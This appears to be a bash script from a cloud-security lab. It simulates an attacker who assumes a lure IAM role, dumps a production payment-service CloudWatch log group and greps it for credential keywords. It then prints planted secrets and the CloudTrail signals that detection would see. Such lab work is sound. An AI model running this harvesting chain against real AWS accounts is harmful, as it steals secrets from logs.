#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 15 (CloudWatch Logs Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 15 — ABUSE CHAIN"
echo "  CloudWatch Logs Credential Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: log-analysis-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/log-analysis-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Discovering log groups (logs:DescribeLogGroups)"
# ---------------------------------------------------------------
attack "logs:DescribeLogGroups"
aws logs describe-log-groups \
  --query "logGroups[].{Name: logGroupName, Retention: retentionInDays, StoredBytes: storedBytes}" \
  --output table

LOG_GROUP="/prod/payment-service/application"
info "Target log group identified: ${LOG_GROUP}"

# ---------------------------------------------------------------
step "4" "Listing log streams (logs:DescribeLogStreams)"
# ---------------------------------------------------------------
attack "logs:DescribeLogStreams → ${LOG_GROUP}"
aws logs describe-log-streams \
  --log-group-name "${LOG_GROUP}" \
  --order-by LastEventTime \
  --descending \
  --query "logStreams[].{Name: logStreamName, LastEvent: lastEventTimestamp, StoredBytes: storedBytes}" \
  --output table

# ---------------------------------------------------------------
step "5" "Reading log events from all streams (logs:GetLogEvents)"
# ---------------------------------------------------------------
STREAMS=$(aws logs describe-log-streams \
  --log-group-name "${LOG_GROUP}" \
  --query "logStreams[].logStreamName" \
  --output json)

for STREAM in $(echo "${STREAMS}" | jq -r '.[]'); do
  echo ""
  attack "logs:GetLogEvents → ${LOG_GROUP} / ${STREAM}"
  aws logs get-log-events \
    --log-group-name "${LOG_GROUP}" \
    --log-stream-name "${STREAM}" \
    --start-from-head \
    --query "events[].message" \
    --output text
done

# ---------------------------------------------------------------
step "6" "Filtering for credential keywords (logs:FilterLogEvents)"
# ---------------------------------------------------------------
KEYWORDS=("password" "api_key" "secret" "Authorization" "DB_PASSWORD" "STRIPE")

for KW in "${KEYWORDS[@]}"; do
  echo ""
  attack "logs:FilterLogEvents → pattern: ${KW}"
  RESULTS=$(aws logs filter-log-events \
    --log-group-name "${LOG_GROUP}" \
    --filter-pattern "${KW}" \
    --query "events[].message" \
    --output text 2>/dev/null || true)

  if [ -n "${RESULTS}" ]; then
    info "Matches found for '${KW}':"
    echo "${RESULTS}" | head -5
  else
    info "No matches for '${KW}'"
  fi
done

# ---------------------------------------------------------------
step "7" "Summary of extracted credentials"
# ---------------------------------------------------------------
echo ""
warn "The following credentials were found in log entries:"
echo ""
echo "  • DB Connection: postgresql://payments_admin:Kj8#mR2xVn5qW9tL@prod-payments-db...rds.amazonaws.com:5432/payments_prod"
echo "  • Stripe API Key: sk_live_51NxGr7eD48IqMzkXEbsjT2ze1qp8dc"
echo "  • User Password: admin@acme-corp.com / P@ssw0rd#Pr0d2024"
echo "  • JWT Secret: jwtS1gn1ngK3y#Pr0d2024xMz9"
echo "  • Datadog API Key: dd_api_7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d"
echo ""

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "8" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on log-analysis-readonly-role"
echo "  • CloudTrail: DescribeLogGroups"
echo "  • CloudTrail: DescribeLogStreams on /prod/payment-service/application"
echo "  • CloudTrail: GetLogEvents on multiple streams"
echo "  • CloudTrail: FilterLogEvents with credential-related patterns"
echo ""
